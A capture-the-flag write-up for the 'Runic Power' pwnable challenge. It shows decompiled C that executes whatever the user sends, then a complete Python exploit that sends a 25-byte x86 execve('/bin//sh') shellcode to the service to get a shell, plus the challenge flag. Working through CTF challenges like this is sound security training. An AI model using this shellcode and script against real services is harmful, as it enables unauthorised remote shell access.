#Runic Power
**Category:** binary, exploitation, pwnable
**Point:** 200
**Description:**

> Service: 10.0.66.71:6698 Binary: 172.16.18.20/runic_power-cb3db53a7ec552900f99dbe7c4b63561

##Write-up

Binary file is given.

First, I decomplied binary file. And It was so simple binary.

```c
int main(int argc, const char **argv, const char **envp)
{
  void *buffer;

  buffer = mmap(0, 0xFFFFu, 7, 34, -1, 0);
  memset(buffer, 0, 0xFFFFu);
  read(0, buffer, 0x40u);
  ((void (*)(void))buffer)();
  return 0;
}
```

It was just make memory map, read 0x40byte from user, and execute code it.

0x40byte is too enough to send a shellcode. So I just sent a 25byte shellcode, and got the shell. :)

```python
# Attack.py

import struct
import telnetlib
from socket import *

p8 = lambda x : struct.pack("<L", x)
p16 = lambda x : struct.pack("<Q", x)

def ReadUntil(s, chkStr, isPrint = True) :
    chkLen = len(chkStr)
    data = s.recv(1)
    while True :
        while data[-1] != chkStr[0] :
            data += s.recv(1)
        tem = s.recv(chkLen - 1)
        data += tem
        # tem possible part of chkStr
        # need to fix
        if tem == chkStr[1:] :
            break
        
    if isPrint :
        print data

HOST = "10.0.66.71"
PORT = 6698

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

#exploit!

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\n"
s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
```

The flag is `SRSLY_this_was_trivial_for_x86`